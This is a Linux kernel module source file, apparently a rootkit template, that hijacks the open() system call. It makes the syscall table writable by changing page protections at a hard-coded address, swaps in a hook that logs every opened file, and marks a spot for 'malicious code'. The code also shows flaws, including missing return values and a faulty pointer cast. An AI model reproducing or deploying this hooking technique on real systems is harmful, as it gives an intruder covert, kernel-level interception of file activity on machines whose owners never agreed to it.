#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/unistd.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Alan <ex0dus@codemuch.tech>");
MODULE_VERSION("0.0.1");
MODULE_DESCRIPTION("We hack the kernel");

unsigned long *sys_call_table = (unsigned long) 0xffffffffbbc00180;

/* This defines a pointer to the real open() syscall */
asmlinkage int (*old_open)(const char *filename, int flags, int mode);

/* enable use to memory page and write to it */
int
set_addr_rw(long unsigned int _addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(_addr, &level);

    if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
}

/* ensure that when cleanup occurs, make page write-protected */
int
set_addr_ro(long unsigned int _addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(_addr, &level);

    pte->pte = pte->pte &~_PAGE_RW;
}

asmlinkage int
new_open(const char *filename, int flags, int mode)
{

    /* perform our malicious code here */
    printk(KERN_INFO "Intercepting open(%s, %X, %X)\n", filename, flags, mode);

    /* give execution BACK to the original syscall */
    return (*old_open)(filename, flags, mode);
}

static int __init
init(void)
{
    printk(KERN_INFO "Welcome to Kernel Town!\n");

    /* allow us to write to memory page, so that we can hijack the system call */
    set_addr_rw((unsigned long) sys_call_table);

    /* grab system call number definition from sys_call_table */
    old_open = (void *) sys_call_table[__NR_open];

    /* set the open symbol to our new_open system call definition */
    sys_call_table[__NR_open] = new_open;

    return 0;
}

static void __exit
cleanup(void)
{
    /* set the open symbol BACK to the old open system call definition */
    sys_call_table[__NR_open] = old_open;

    /* set memory page back to read-only */
    set_addr_ro((unsigned long) sys_call_table);

    printk(KERN_INFO "We are now leaving Kernel Town! Thanks for the stay!\n");
    return;
}

module_init(init);
module_exit(cleanup);
